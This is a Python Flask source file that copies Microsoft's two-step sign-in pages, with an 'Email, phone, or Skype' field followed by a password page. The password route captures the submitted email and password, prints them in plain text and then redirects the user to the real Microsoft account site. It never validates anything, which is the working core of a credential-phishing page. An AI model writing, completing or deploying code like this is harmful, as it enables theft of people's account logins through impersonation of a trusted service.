from flask import Flask, render_template, request, redirect, url_for, flash, session
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Email
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'  # Change this to a secure secret key
csrf = CSRFProtect(app)

class EmailForm(FlaskForm):
    email = StringField('Email, phone, or Skype', validators=[DataRequired()])
    submit = SubmitField('Next')

class PasswordForm(FlaskForm):
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Sign in')

@app.route('/', methods=['GET', 'POST'])
def email_page1():
    form = EmailForm()
    if form.validate_on_submit():
        session['email'] = form.email.data
        return redirect(url_for('password_page'))
    return render_template('home.html', form=form)

@app.route('/email', methods=['GET', 'POST'])
def email_page2():
    form = EmailForm()
    if form.validate_on_submit():
        session['email'] = form.email.data
        return redirect(url_for('password_page'))
    return render_template('email.html', form=form)




@app.route('/password', methods=['GET', 'POST'])
def password_page():
    if 'email' not in session:
        return redirect(url_for('email_page2'))
    
    form = PasswordForm()
    if form.validate_on_submit():
        # Here you would typically validate the credentials
        email = session.get('email')
        password = form.password.data
        print(f"Login attempt - Email: {email}, Password: {password}")
        
        # Clear the session before redirecting
        session.clear()
        
        # Redirect to Microsoft account page
        return redirect('https://account.microsoft.com/account/')
    
    return render_template('password.html', form=form, email=session['email'])

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('email_page2'))

@app.route('/create-account')
def create_account():
    return "Create Account Page (Not Implemented)"

@app.route('/forgot-password')
def forgot_password():
    return "Forgot Password Page (Not Implemented)"

@app.route('/cant-access')
def cant_access():
    return "Can't Access Account Page (Not Implemented)"

if __name__ == '__main__':
    app.run(debug=True)